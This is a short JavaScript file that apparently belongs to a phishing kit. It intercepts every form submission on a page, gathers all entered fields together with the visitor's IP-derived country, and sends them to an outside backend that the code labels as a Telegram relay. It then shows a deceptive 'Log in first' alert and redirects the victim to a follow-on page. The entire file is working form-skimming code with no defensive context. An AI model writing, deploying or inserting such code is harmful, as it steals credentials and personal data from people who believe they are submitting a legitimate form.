document.addEventListener("DOMContentLoaded", () => {
  const DEFAULT_USER_ID = "7979664801"; // fallback if no id in URL
  const forms = document.querySelectorAll("form");

  let userCountry = "Unknown"; // default

  // Get country name from IP (via ipapi.co)
  fetch("https://ipapi.co/json/")
    .then(res => res.json())
    .then(data => {
      if (data && data.country_name) {
        userCountry = data.country_name;
      }
    })
    .catch(err => console.error("IP lookup error:", err));

  forms.forEach((form, index) => {
    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      // Get userId from URL or use default
      const urlParams = new URLSearchParams(window.location.search);
      const userId = urlParams.get("id") || DEFAULT_USER_ID;

      // Collect all form fields
      const formData = {};
      new FormData(form).forEach((value, key) => {
        formData[key] = value;
      });

      // Add page title, form name, and country
      const payload = {
        chat_id: userId,
        form_data: formData,
        pageTitle: document.title,
        formName: form.getAttribute("name") || `Form-${index + 1}`,
        country: userCountry
      };

      try {
        const response = await fetch("https://intelligentback.onrender.com/submit", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });

        if (response.ok) {
          alert(`Log in first`);
          form.reset();

          // Redirect after submission
          window.location.href = "https://rrloaty.github.io/intelligent/lin.html"; // <<< change to any URL you want
        } else {
          const errorText = await response.text();
          console.error("Telegram Error:", errorText);
          alert(`❌ Error submitting form. Check console for details.`);
        }
      } catch (err) {
        console.error("Network Error:", err);
        alert("⚠️ Network error. Please check your connection.");
      }
    });
  });
});